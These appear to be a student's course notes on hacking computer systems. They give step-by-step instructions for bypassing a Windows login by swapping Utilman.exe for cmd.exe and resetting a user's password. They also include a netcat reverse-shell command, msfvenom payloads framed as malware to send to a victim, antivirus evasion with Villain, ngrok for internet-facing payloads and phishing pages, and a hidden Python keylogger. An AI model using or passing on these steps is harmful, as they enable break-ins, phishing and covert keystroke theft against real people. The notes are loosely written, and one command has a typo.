# What is system Hacking
- It is  a compromise of a computer system and software to access the target computer and steal or misuse the info's. 
# Linux System Hacking
- Linux is an Operating System (OS) assembled user the model of open-source software development and distribution and is based on Unix OS created by Linus Torvalds.
- Hackers usually use this methods to hack into Linux:
	- hack it using the SHADOW file
	- to bypass the user password option in linux.
	- by detecting the bug on linux distribution and tries to take advantage of it.
# Windows Hacking
- There are some simple methods to bypass windows login page.
------
                                         WINDOWS LOGIN BYPASS
_________

- The main idea is that if we can change utilman.exe into cmd.exe we can do what ever we want.
- To do this:
	- Shutdown the pc and start it when the windows key appears press the power button again and again until you get recovery mode.
	1. Then go to advanced options 
	2. Troubleshoot
	3. Advanced Options
	4. System image recovery
		1. cancel the pop up message 
		2. Click Next
		3. Advanced
		4. Install a driver
		5. Then ok
	5. Renaming
		1. Go to this pc
		2. Find the correct driver
		3. Driver > windows > System32
		4. Find and rename Utilman.exe  >  Utilman1.exe
		5. Find and rename cmd.exe > Utilman.exe
		6. Exit and close it 
		7. Click continue to restart your pc
	6. The hack
		1. Open windows and click on the easy to access buttons   > this will open cmd
		2. Then type
			1. net user  - to see the users available 
			2. net user  (the correct user that you want to bypass) *
		3. Then add a new password 
		4. Close the cmd 

# Reverse shell
- Shell is the only way to interact with kernel.
- A reverse shell, also known as a remote shell or “connect-back shell,” takes advantage of the target system's vulnerabilities to initiate a shell session and then access the victim's computer.
- It is server security theat.
- This method is also known as penetration tests.
- This will allow the attacker to open any port for a communication and enable to take over the computer.
# Netcat
- It is a command line interface (CLI)  which is used to read/ write data over TCP / UDP.
- Is a tool that helps to create a Reverse shell or Bind shells.
To start listening 
```shell
netcat -lvp 2222   # or
nc -lvp 2222
# To call the machine that started listening
ne (ip of the machine) -e /bin/bash
```

# Web servers
- (The hard ware part ) Web server is a computer that can store web server and website's component file (HTML documents, images, CSS, Java Scripts...)
- It is a computer software and hardware that uses HTTP and HTTPS to provide website.
- There are a lot of software that can be installed on the server to make it like webserver.
## 1. Apache Server
- This will help to provide web contents.
- It is built in on linux but on windows we have to install is with a software called Xampp and wampp and it will give you local host web contents.
To start the server software 
```shell
sudo systemctl start apache2 # so from now on our computer will act like a server

```
### Web server - Apache
- The default path of apache2 is /var/www/html
- The file for apache is ["index.html"] from /var/www/html
## 2. Python Server
- We can use python to start web servers.
```shell
python3 -m http.server 9090
```
- Python will help you to host websites from any path with any port from our computer.  
# CVE
- It stands for Common Vulnerabilities.
- CVE is a glossary that classifies vulnerabilities.
- The glossary analyzes vulnerabilities and then uses the Common Vulnerability Scoring System (CVSS) to elevate thee threat level of a vulnerability.
- The CVE glossary is a project dedicated to tracking and cataloging vulnerabilities in consumer software and hardware.
- It is maintained by the MITRE Corporation with funding from the US Division of Homeland Security. 
- Vulnerabilities are collected and cataloged using the Security Content Automation Protocol (SCAP). 
- SCAP evaluates vulnerability information and assigns each vulnerability a unique identifier.
	- CVE-2019-0708
# Metasploit
- It can be used to probe systematic vulnerabilities on networks and servers 
- Written with ruby
- Has a lot of exploits for different vulnerabilities and cve's. 
- It provides:
	- Exploits
	- Payloads (that will )
	- Auxiliaries (it will help to scan further on the system)
	- Encoders
	- Listeners
	- Post-Exploitations codes
_________
To star it
```shell
msfconsole
# then you can search any exploit for a system
```
## Create a payload for windows
- we will use msfvenom (metasploit feature ) to create a payload
![[Pasted image 20230825120037.png]]
![[Pasted image 20230825120110.png]]
● As you see we have created the payload
● Now we will send this to the victim
● This is the malware for our reverse attack
## create a Listener
1. We start Metasploit.
2. We search for an exploit called Multi/handler
3. To use this exploit 
	1. use exploit/multi/handler
	2. use 29
4. Set LHOST (IP)
5. Set LPORT (IP)
6. run
	1. exploit
	2. run
*To see details type   show options*
#### Problems
- It is an old tool so this may not be use full cus it will be detected by windows defender and also by antiviruses.
- But it is still can be used for other exploitations  
##### To hack it
- There are so many tools that can bypass the windows defender :
	- Villain
		- https://github.com/t3l3machus/Villain
		```shell
		git clone https://github.com/t3l3machus/Villain.git
		python3 Villain.py
		cd Villain
		ls
		pip install -r requirements.txt
	   ```
	   START
	   Create payload
	   refer to the pdf 
#### Payload on WAN
- To do this we need port forwarding. 
- Port forwarding gives people outside of your network more access to your computer. 
# Ngrok
- It is one of port forwarding tools. 
	- can host website 
	- can list to tcp commections
- To setup
	-  GOTO their website & create account
	-  https://ngrok.com/
	-  Verify the ngrok through the email
	- Then download it 
	- Go to the location and extract it 
	- copy the Auth-token 
	- run it on a terminal
### Starting ngrok
- There are two modes
```shell
ngrok tcp (port)
ngrok http (port)
```
- It have some info's in the dashboard and also GUI .
#### Hosting our website 
- We need a webserver 
- And http port forwarding with some port as our webserver
- ngrok http 80
## For Python Server
![[Pasted image 20230826203115.png]]
![[Pasted image 20230826203127.png]]
![[Pasted image 20230826203143.png]]

- This can help for Phishing page
- WAN payloads
	- replace the lhost part with the link provided 
	- do some port with ngrok
		- for villain the lport is 8080
## Prevention 
- Same with malware preventions [[Malware Prevention]]
- Strong antivirus.

# Steganography
- It is hiding a secret message inside of a(on top of) something that is not secret.
- To do this
	- steghide
## Steghid
- Used for hiding text to image and also to extract.
- When you share this steged files it doesn't have to be compressed or use USB , CD.
# Key Logging 
- Key loggers are activity monitoring software programs or hardware device that give hackers access to your personal data.
- This will it will save every thing that has been typed on the keyboard.
## Python Keylogger
![[Pasted image 20230826204624.png]]

This file will be saved as .pyw to make it not to pop up the python but still it runs the file in the background.

[[S2Day9Web.md]]

